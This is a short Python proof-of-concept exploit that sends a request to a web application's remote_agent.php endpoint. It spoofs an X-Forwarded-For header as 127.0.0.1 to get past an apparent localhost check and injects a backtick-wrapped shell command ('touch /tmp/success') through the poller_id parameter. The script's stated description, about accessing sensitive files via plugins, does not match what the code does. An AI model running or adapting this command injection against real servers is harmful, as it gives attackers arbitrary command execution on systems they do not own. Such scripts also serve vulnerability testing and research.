import requests
import argparse

# Set up argument parsing
parser = argparse.ArgumentParser(description="Attempt to access sensitive files via various plugins.")
parser.add_argument('--target', type=str, default='localhost:8080', help='Target host (default: localhost:8080)')

args = parser.parse_args()

# Use arguments from CLI or default values
target = args.target

url = f'http://{target}/remote_agent.php?action=polldata&local_data_ids[0]=6&host_id=1&poller_id=`touch+/tmp/success`'

headers = {
    "X-Forwarded-For": "127.0.0.1",
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate",
    "Connection": "close",
    "Upgrade-Insecure-Requests": "1"
}

response = requests.get(url, headers=headers)

print(response.status_code)
print(response.text)
